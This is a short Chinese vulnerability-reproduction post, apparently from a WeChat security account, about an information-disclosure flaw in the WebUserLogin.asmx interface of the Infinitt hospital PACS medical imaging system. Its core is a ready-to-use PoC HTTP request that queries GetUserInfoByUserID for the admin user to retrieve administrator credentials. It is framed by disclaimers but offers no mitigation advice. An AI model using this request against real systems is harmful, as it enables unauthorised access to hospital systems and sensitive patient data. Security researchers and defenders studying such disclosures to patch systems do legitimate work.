#  【漏洞复现】英飞达医学影像存档与通信系统WebUserLogin.asmx存在信息泄露   
 什么安全   2024-12-09 02:12  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！  
  
**产品介绍**  
  
英飞达医学影像存档与通信系统 Picture Archiving and Communication System，它是应用在医院影像科室的系统，主要的任务就是把日常产生的各种医学影像通过各种接口以数字化的方式海量保存起来，当需要的时候在一定的授权下能够很快的调回使用，同时增加一些辅助诊断管理功能。它在各种影像设备间传输数据和组织存储数据具有重要作用。  
  
漏洞描述  
  
英飞达医学影像存档与通信系统 WebUserLogin.asmx 接口存在信息泄露漏洞，攻击者可通过该漏洞获取系统管理员账户密码信息，登录系统获取敏感信息。  
  
漏洞版本  
  
VER 3.0.11.5_B9P0  
  
Poc  
```
GET /webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin HTTP/1.1
Host: IP
```  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/w0DeFbFI15yEpmQfhtedCk0icl7LWRenrZCiaOX8fQxic72cc8JLmAic789MOaRkblLZdVNpRZrM6NLIjGBr8IhgxA/640?wx_fmt=png&from=appmsg "")  
  
小  
知  
识  
  
  
  
  
**依据《刑法》第285条第3款的规定，犯提供非法侵入或者控制计算机信息罪的，处3年以下有期徒刑或者****拘役****，并处或者单处****罚金****;情节特别严重的，处3年以上7年以下有期徒刑，并处罚金。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gn0JbCnxttRbj4Mib3fcSfwr0tP4UxXtjf47HFwaZcgwWStzGNLNMlGKQJz902fHTT8PCfOwHedLqarXh0eC9KQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
声  
明  
  
  
  
**本文提供的技术参数仅供学习或运维人员对内部系统进行测试提供参考，未经授权请勿用本文提供的技术进行破坏性测试，利用此文提供的信息造成的直接或间接损失，由使用者承担。**  
  
  
  
